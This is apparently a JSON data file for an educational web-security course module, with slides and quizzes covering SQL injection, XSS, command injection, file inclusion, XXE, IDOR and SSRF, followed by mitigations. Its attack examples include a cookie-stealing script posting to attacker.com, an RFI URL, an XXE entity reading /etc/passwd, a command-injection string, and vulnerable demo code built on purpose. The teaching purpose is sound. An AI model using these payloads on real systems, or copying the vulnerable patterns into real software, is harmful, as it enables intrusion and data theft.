{
    "id": "web_exploitation",
    "topicId": "web_exploit",
    "topicTitle": "Web Exploitation",
    "description": "Dive into the most common web vulnerabilities including SQL Injection, XSS, and Command Injection.",
    "baseKP": 100,
    "slides": [
        {
            "id": "web_exp_1",
            "type": "content",
            "title": "Introduction to Web Exploitation",
            "content": "# Web Exploitation üåê\n\nWeb applications are the most common interface for modern services, making them a prime target for attackers.\n\n## Key Topics\n- **SQL Injection (SQLi)** - Attacking databases\n- **Cross-Site Scripting (XSS)** - Attacking users\n- **Command Injection** - Attacking the server OS\n- **File Inclusion** - Reading local files or executing remote code\n- **XXE** - XML External Entity attacks\n\n> üõ°Ô∏è **Note:** We will look at how to break apps to learn how to build them securely."
        },
        {
            "id": "web_exp_2",
            "type": "content",
            "title": "SQL Injection (SQLi) Basics",
            "content": "# SQL Injection (SQLi) üíâ\n\nSQLi occurs when user input is concatenated directly into a database query without validation or escaping.\n\n## The Vulnerability\nCode: `query = \"SELECT * FROM users WHERE name = '\" + user_input + \"';\"`\n\n- If `user_input` is `Alice`, the query works as expected.\n- If `user_input` is `' OR '1'='1`, the query becomes:\n  `SELECT * FROM users WHERE name = '' OR '1'='1';`\n\nSince `'1'='1'` is always true, the database returns **all** users, bypassing authentication!"
        },
        {
            "id": "web_exp_3",
            "type": "content",
            "title": "Types of SQL Injection",
            "content": "# Types of SQLi üóÇÔ∏è\n\n1. **In-band (Classic):** Results are returned in the response.\n   - *Error-based:* DB errors reveal structure.\n   - *Union-based:* Uses `UNION` to combine results from other tables.\n2. **Blind (Inferential):** No data returned, but behavior changes.\n   - *Boolean-based:* Page content changes if query is true/false.\n   - *Time-based:* DB pauses (e.g., `SLEEP(5)`) if query is true.\n3. **Out-of-band:** Data is sent over a different channel (e.g., DNS request)."
        },
        {
            "id": "web_exp_4",
            "type": "content",
            "title": "SQLi Demo: Authentication Bypass",
            "content": "# SQLi Authentication Bypass üîì\n\nA simple login bypass example.\n\n```python\n# Vulnerable Login Logic\nusername = input(\"User: \") # Attacker enters: admin' --\nquery = f\"SELECT * FROM users WHERE user = '{username}' AND pass = '...'\"\n# Result: SELECT * FROM users WHERE user = 'admin' --' AND pass = '...'\n# The '--' comments out the password check!\n```\n\n<!-- FULL_CODE_START\nimport sqlite3\n\n# Setup in-memory DB\nconn = sqlite3.connect(':memory:')\ncursor = conn.cursor()\ncursor.execute('CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)')\ncursor.execute(\"INSERT INTO users (username, password) VALUES ('admin', 'supersecret')\")\ncursor.execute(\"INSERT INTO users (username, password) VALUES ('guest', 'guest123')\")\n\ndef vulnerable_login(input_user, input_pass):\n    # VULNERABLE: Direct string formatting\n    query = f\"SELECT * FROM users WHERE username = '{input_user}' AND password = '{input_pass}'\"\n    print(f\"Executing Query: {query}\")\n    try:\n        cursor.execute(query)\n        user = cursor.fetchone()\n        if user:\n            print(f\"‚úÖ Login Successful! Welcome, {user[1]}\")\n        else:\n            print(\"‚ùå Login Failed\")\n    except Exception as e:\n        print(f\"‚ùå Database Error: {e}\")\n\nprint(\"--- Normal Login ---\")\nvulnerable_login(\"guest\", \"guest123\")\n\nprint(\"\\n--- SQL Injection Attack ---\")\n# Injecting payload to bypass password check\n# Payload: admin' --\nvulnerable_login(\"admin' --\", \"anything\")\n\nFULL_CODE_END -->"
        },
        {
            "id": "web_exp_5",
            "type": "content",
            "title": "Cross-Site Scripting (XSS)",
            "content": "# Cross-Site Scripting (XSS) üìú\n\nXSS allows attackers to inject malicious scripts into web pages viewed by other users.\n\n## Impact\n- Stealing session cookies (Account Takeover)\n- Keylogging\n- Phishing\n- Defacement\n\n## Types\n1. **Reflected (Non-Persistent):** Malicious script comes from the current HTTP request (e.g., in a URL parameter).\n2. **Stored (Persistent):** Malicious script is saved on the server (e.g., in a comment) and served to victims.\n3. **DOM-based:** Vulnerability exists in client-side code (JavaScript) managing the DOM."
        },
        {
            "id": "web_exp_6",
            "type": "content",
            "title": "XSS Example",
            "content": "# XSS in Action üé¨\n\nImagine a search feature that echoes your query back to you.\n\n**URL:** `http://site.com/search?q=<script>alert(1)</script>`\n\nIf the site displays:\n`You searched for: <script>alert(1)</script>`\n...the browser will execute the JavaScript! üö®\n\n**Payload to steal cookies:**\n```javascript\n<script>\n  fetch('http://attacker.com/steal?cookie=' + document.cookie);\n</script>\n```"
        },
        {
            "id": "web_exp_quiz_1",
            "type": "quiz",
            "title": "XSS Check",
            "content": "Test your understanding of XSS types.",
            "quizQuestion": "Which type of XSS involves the malicious script being permanently stored on the target server (e.g., in a database)?",
            "quizOptions": [
                "Reflected XSS",
                "Stored XSS",
                "DOM XSS",
                "Self XSS"
            ],
            "correctOptionIndex": 1
        },
        {
            "id": "web_exp_7",
            "type": "content",
            "title": "Command Injection",
            "content": "# Command Injection üíª\n\nOccurs when an application passes unsafe user-supplied data (forms, cookies, HTTP headers) to a system shell.\n\n## Example\nA tool to ping an IP:\n`os.system(\"ping -c 1 \" + user_ip)`\n\n**User Input:** `127.0.0.1; cat /etc/passwd`\n**Executed:** `ping -c 1 127.0.0.1; cat /etc/passwd`\n\nThe `;` separates commands, allowing the attacker to execute `cat /etc/passwd` after the ping finishes."
        },
        {
            "id": "web_exp_8",
            "type": "content",
            "title": "Command Injection Demo",
            "content": "# Command Injection Simulation ‚ö†Ô∏è\n\nDemonstrating how input chaining works.\n\n<!-- FULL_CODE_START\nimport subprocess\n\ndef ping_service(target):\n    # VULNERABLE: Passing shell=True with untrusted input\n    # In a real app, arguments should be passed as a list to avoid shell parsing.\n    command = f\"echo 'Pinging {target}...'\"\n    print(f\"[Server] Executing: {command}\")\n    \n    # Simulating execution\n    # We use echo instead of actual ping to be safe and fast on Piston\n    try:\n        output = subprocess.check_output(command, shell=True, text=True)\n        print(f\"[Output]\\n{output}\")\n    except subprocess.CalledProcessError as e:\n        print(f\"Error: {e}\")\n\nprint(\"--- Standard Usage ---\")\nping_service(\"8.8.8.8\")\n\nprint(\"\\n--- Command Injection ---\")\n# Injects a second command using ';'\n# Payload: 8.8.8.8; echo 'HACKED: /etc/passwd content exposed!'\nping_service(\"8.8.8.8; echo 'HACKED: Secret File Content Exposed!'\")\nFULL_CODE_END -->"
        },
        {
            "id": "web_exp_9",
            "type": "content",
            "title": "File Inclusion (LFI/RFI)",
            "content": "# File Inclusion üìÇ\n\nMany web apps dynamically include files based on input.\nPHP Example: `include($_GET['page']);`\n\n## Local File Inclusion (LFI)\nInput: `../../../../etc/passwd`\nThe app navigates up directories (`..`) and reads sensitive system files.\n\n## Remote File Inclusion (RFI)\nInput: `http://attacker.com/evil.php`\nThe app downloads and executes a malicious script from the attacker's server (requires `allow_url_include=On`)."
        },
        {
            "id": "web_exp_10",
            "type": "content",
            "title": "XXE (XML External Entity)",
            "content": "# XXE Attacks üìÑ\n\nXML parsers can be configured to parse external entities defined in the DTD.\n\n## The Attack\nAn attacker creates a malicious XML payload:\n\n```xml\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n  <!ELEMENT foo ANY >\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<foo>&xxe;</foo>\n```\n\nIf the server parses this, `&xxe;` is replaced with the contents of `/etc/passwd`. XXE can also be used for SSRF (Server-Side Request Forgery) or Denial of Service (Billion Laughs attack)."
        },
        {
            "id": "web_exp_11",
            "type": "content",
            "title": "Broken Authentication",
            "content": "# Broken Authentication üîë\n\nVulnerabilities in session management or login mechanisms.\n\n## Common Issues\n- **Weak Passwords:** Allowing \"123456\" or \"password\".\n- **Credential Stuffing:** Attackers trying username/password pairs leaked from other sites.\n- **Session Fixation:** Authenticatiing a user without invalidating their generic session ID, allowing an attacker who knows that ID to hijack the session.\n- **Predictable Session IDs:** Generating IDs sequentially."
        },
        {
            "id": "web_exp_12",
            "type": "content",
            "title": "Insecure Direct Object References (IDOR)",
            "content": "# IDOR üÜî\n\nIDOR occurs when an app exposes internal object IDs (like database keys) and fails to validate access rights.\n\n## Scenario\nUser visits: `http://site.com/invoice?id=100`\n\nAttacker changes URL to: `http://site.com/invoice?id=101`\n\nIf the server returns Invoice #101 without checking if the current user *owns* that invoice, it's an IDOR vulnerability."
        },
        {
            "id": "web_exp_quiz_2",
            "type": "quiz",
            "title": "Vulnerability ID",
            "content": "Identify the vulnerability.",
            "quizQuestion": "An attacker inputs '../' multiple times to access files outside the web root. What is this attack called?",
            "quizOptions": [
                "SQL Injection",
                "Directory Traversal / LFI",
                "Cross-Site Scripting",
                "Command Injection"
            ],
            "correctOptionIndex": 1
        },
        {
            "id": "web_exp_13",
            "type": "content",
            "title": "Security Misconfiguration",
            "content": "# Security Misconfiguration ‚öôÔ∏è\n\nUsually the easiest to find!\n\n- **Default Accounts:** `admin` / `admin` on routers or CMS.\n- **Verbose Error Messages:** Errors revealing stack traces, database versions, or file paths.\n- **Unprotected Directories:** Leaving `.git` folders or backup files (`backup.zip`) accessible publicly.\n- **Open Cloud Storage:** Unsecured S3 buckets."
        },
        {
            "id": "web_exp_14",
            "type": "content",
            "title": "Server-Side Request Forgery (SSRF)",
            "content": "# SSRF üîÑ\n\nSSRF tricks a server into making requests to internal or external resources on behalf of the attacker.\n\n## Scenario\nApp takes a URL to fetch a profile image: `http://site.com/fetch?url=...`\n\nAttacker sends: `http://site.com/fetch?url=http://localhost:8080/admin`\n\nThe server (trusted by the internal network) fetches the internal admin page and shows it to the attacker, bypassing external firewalls."
        },
        {
            "id": "web_exp_15",
            "type": "content",
            "title": "Mitigation Strategies",
            "content": "# Defending Web Apps üõ°Ô∏è\n\nHow to stop these attacks:\n\n- **SQLi:** Use **Prepared Statements** (Parameterized Queries). Never concatenate input.\n- **XSS:** **Context-aware Output Encoding**. Escape special chars (`<` becomes `&lt;`) before displaying.\n- **Command Injection:** Avoid calling shell commands. If necessary, use APIs that don't invoke a shell (e.g., `exec()` vs `system()`).\n- **XXE:** Disable DTD/External Entity processing in XML parsers.\n- **LFI:** Use whitelists for file names. Use `basename()` to strip directory separators."
        },
        {
            "id": "web_exp_16",
            "type": "content",
            "title": "Secure Coding Example",
            "content": "# Secure Coding: SQLi Prevention üîí\n\nUsing Python's sensitive (SQLite) library correctly.\n\n<!-- FULL_CODE_START\nimport sqlite3\n\nconn = sqlite3.connect(':memory:')\ncursor = conn.cursor()\ncursor.execute('CREATE TABLE users (username TEXT, password TEXT)')\ncursor.execute(\"INSERT INTO users VALUES ('admin', 'pass')\")\n\ndef secure_login(user, pwd):\n    query = \"SELECT * FROM users WHERE username = ? AND password = ?\"\n    # sending data separately from the query logic\n    cursor.execute(query, (user, pwd))\n    if cursor.fetchone():\n        print(\"Login: Success\")\n    else:\n        print(\"Login: Failed\")\n\n# Attempting injection\nmalicious_user = \"admin' --\"\n\nprint(\"Attempting injection with Prepared Statement...\")\nsecure_login(malicious_user, \"random\")\n# The database treats \"admin' --\" as the literal username, not code.\nFULL_CODE_END -->"
        },
        {
            "id": "web_exp_17",
            "type": "content",
            "title": "Summary",
            "content": "# Web Security Summary üéì\n\nWeb applications face numerous threats. Understanding these mechanics is crucial for defense.\n\n## Recap\n- **Sanitize Input:** Never trust user data.\n- **Encode Output:** Prevent browser from interpreting data as code (XSS).\n- **Parameterize Queries:** Stop SQL injection.\n- **Validate Rights:** Check specific permissions for every object access (IDOR).\n- **Keep Updated:** Patch libraries and servers regularly to avoid known exploits."
        }
    ]
}